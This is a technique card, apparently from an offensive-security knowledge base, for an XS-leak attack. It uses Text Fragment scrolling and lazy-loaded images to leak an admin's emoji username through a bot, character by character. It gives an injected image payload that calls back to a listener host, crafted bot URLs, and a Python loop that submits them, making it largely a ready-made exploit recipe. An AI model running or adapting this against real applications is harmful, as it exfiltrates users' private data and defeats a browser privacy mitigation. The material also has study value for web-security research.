---
name: text_fragment_scroll_lazy_img_blind_exfil
vuln_type: xss
sub_technique: text_fragment_scroll_oracle
category: exploitation
safety_level: safe
tags:
- text-fragment
- scroll-oracle
- lazy-loading
- blind
- emoji
- dompurify
- bot
---

# Text Fragment (#:~:Text=) Scroll Oracle + Lazy Loading Image Blind Exfil

## When to Apply

The target uses DOMPurify (default config allows loading=lazy). Content is rendered in a scrollable page. The bot supports Text Fragments (#:~:text=). The secret (username) uses emoji characters, which count as individual words under Unicode Text Segmentation (UAX#29), making per-character matching possible.

## Prerequisites

- DOMPurify with default config (allows loading='lazy' on images)
- Bot that navigates via driver.get() (user activation for text fragments)
- Secret composed of emoji (each emoji = one word boundary unit)
- Ability to create multiple documents with controlled content

## Steps

1. Create 16 documents, each containing `<br>*200` (spacer) + `asdf<img src='http://LISTENER/{i}' loading='lazy'>`.
2. For each character position, submit 16 bot requests:
   `http://localhost:3000/view/{doc}#:~:text={emoji_candidate}&text=asdf`
3. If the emoji matches the page's admin username, the browser scrolls to the top match — the lazy image at the bottom does NOT load.
4. If the emoji doesn't match, the browser scrolls to the bottom 'asdf' — the lazy image DOES load and triggers a callback.
5. The missing callback reveals the correct character.
6. Repeat for all 12 characters of the admin username.

## Code Template

```
characters = ['\U0001F47B', '\U0001F92A', ...] # 16 emoji candidates
for i in range(16):
    s.post(f'{BASE}/bot', data={
        'url': f'http://localhost:3000/view/{i+2}#:~:text=Username: {characters[i]}&text=asdf'
    })
```

## Examples

### Example 1

- **charset**: 16 emoji characters per round
- **total_rounds**: 12 (username length)
- **oracle_signal**: absence of HTTP callback = correct character match

Text Fragments were designed with scroll-to-text leakage in mind, but the mitigation (word-boundary matching only) is bypassed because emoji count as individual words under Unicode segmentation rules.
